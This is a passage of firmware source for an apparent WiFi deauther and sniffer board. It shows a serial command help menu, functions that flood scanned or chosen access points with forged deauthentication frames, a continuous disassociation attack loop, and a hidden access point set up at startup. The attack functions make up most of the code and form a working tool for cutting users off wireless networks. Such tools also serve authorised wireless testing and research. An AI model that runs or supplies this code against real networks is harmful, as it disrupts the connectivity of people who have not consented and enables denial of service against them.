        Serial.print(" BSSID: ");
        Serial.println(target_aps[i].bssid_str);
      }
    }
    else {
      Serial.println("[INFO] No APs targeted.");
    }
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("[Deauther] Available Commands.");
    Serial.println("  - start deauther       : Begin the deauth attack cycle.");
    Serial.println("  - stop deauther        : Stop all attack cycles.");
    Serial.println("  - scan                 : Perform a WiFi scan and display results.");
    Serial.println("  - results              : Show last scan results.");
    Serial.println("  - disassoc             : Begin continuous disassociation attacks.");
    Serial.println("  - random_attack        : Deauth a randomly chosen AP from the scan list.");
    Serial.println("  - attack_time <ms>     : Start a timed attack for the specified duration.");
    Serial.println("[Sniffer] WiFi Sniffer Commands.");
    Serial.println("  - start sniff          : Enable the sniffer with ALL mode.");
    Serial.println("  - sniff beacon         : Enable/Disable beacon capture.");
    Serial.println("  - sniff probe          : Enable/Disable probe requests/responses.");
    Serial.println("  - sniff deauth         : Enable/Disable deauth/disassoc frames.");
    Serial.println("  - sniff eapol          : Enable/Disable EAPOL frames.");
    Serial.println("  - sniff pwnagotchi     : Enable/Disable Pwnagotchi beacons.");
    Serial.println("  - sniff all            : Enable/Disable all frames.");
    Serial.println("  - stop sniff           : Stop sniffing.");
    Serial.println("  - hop on               : Enable channel hopping.");
    Serial.println("  - hop off              : Disable channel hopping.");
    Serial.println("[Configuration] Set Commands:");
    Serial.println("  - set <key> <value>    : Update configuration values:");
    Serial.println("      * ch X             : Set to specific channel X.");
    Serial.println("      * target <indices> : Set target APs by their indices, e.g., 'set target 1,3,5'.");
    Serial.println("      * cycle_delay (ms) : Delay between scan/deauth cycles.");
    Serial.println("      * scan_time (ms)   : Duration of WiFi scans.");
    Serial.println("      * num_frames       : Number of frames sent per AP.");
    Serial.println("      * start_channel    : Start channel for scanning (1 or 36 for 5GHz only).");
    Serial.println("      * scan_cycles      : on/off - Enable or disable scan between attack cycles.");
    Serial.println("      * led on/off       : Enable or disable LEDs.");
    Serial.println("  - info                 : Display the current configuration.");
    Serial.println("  - help                 : Display this help message.");
  }
  else {
    Serial.println("[ERROR] Unknown command. Type 'help' for a list of commands.");
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if (target_mode && attack_enabled) {
    for (size_t i = 0; i < target_aps.size(); i++) {
      wifi_set_channel(target_aps[i].channel);
      for (int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }
        Serial.print("Deauth frame ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(target_aps[i].ssid);
        Serial.print(" (");
        Serial.print(target_aps[i].bssid_str);
        Serial.print(") on channel ");
        Serial.println(target_aps[i].channel);
      }
    }
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    attackCycle();
  }
}

void attackCycle() {
  Serial.println("Starting attack cycle...");

  uint8_t currentChannel = 0xFF;
  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if (targetChannel != currentChannel) {
      wifi_set_channel(targetChannel);
      currentChannel = targetChannel;
    }

    for (int j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, 2);
      if (USE_LED) {
        digitalWrite(LED_B, HIGH);
        delay(50);
        digitalWrite(LED_B, LOW);
      }
      Serial.print("Deauth frame ");
      Serial.print(j + 1);
      Serial.print(" => ");
      Serial.print(scan_results[i].ssid);
      Serial.print(" (");
      Serial.print(scan_results[i].bssid_str);
      Serial.print(") on channel ");
      Serial.println(scan_results[i].channel);
    }
  }
  Serial.println("Attack cycle completed.");
}

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  if (USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);

    // Simple LED test sequence
    digitalWrite(LED_R, HIGH); delay(200); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(200); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(200); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW);
    digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_B, LOW);
    digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
  }

  Serial.println("Initializing WiFi in hidden AP mode...");
  wifi_on(RTW_MODE_AP);
  wifi_start_ap_with_hidden_ssid(WIFI_SSID,
                                 RTW_SECURITY_WPA2_AES_PSK,
                                 WIFI_PASS,
                                 11,   // keyID
                                 18,   // SSID length
                                 WIFI_CHANNEL);
  Serial.println("Hidden AP started. Selected channel: " + String(WIFI_CHANNEL));

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // Handle commands from Serial
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    handleCommand(command);
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled) {
      // Optionally perform a scan between cycles
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks() == 0) {
          printScanResults();
        }
        else {
          Serial.println("[ERROR] Scan failed.");
        }
      }
      if (target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if (disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    // Decide which list of APs to attack
    const std::vector<WiFiScanResult> &aps_to_attack =
      (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if (aps_to_attack.empty()) {
      Serial.println("[ERROR] No APs available for Disassociation Attack. Perform a scan or set targets first.");
      return;
    }

    for (size_t i = 0; i < aps_to_attack.size(); i++) {
      wifi_set_channel(aps_to_attack[i].channel);

      for (int j = 0; j < num_send_frames; j++) {
        // Reason code 8 => Disassociated because station left
        wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08);

        // Optional LED blink
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }

        Serial.print("[DISASSOC] Frame ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(aps_to_attack[i].ssid);
        Serial.print(" (");
        Serial.print(aps_to_attack[i].bssid_str);
        Serial.print(") on channel ");
        Serial.println(aps_to_attack[i].channel);
      }
    }
    Serial.println("[DISASSOC] Disassociation Attack cycle completed.");
  }
    // Handle channel hopping if enabled
  if (isSniffing) {
    hopChannel();
  }
}
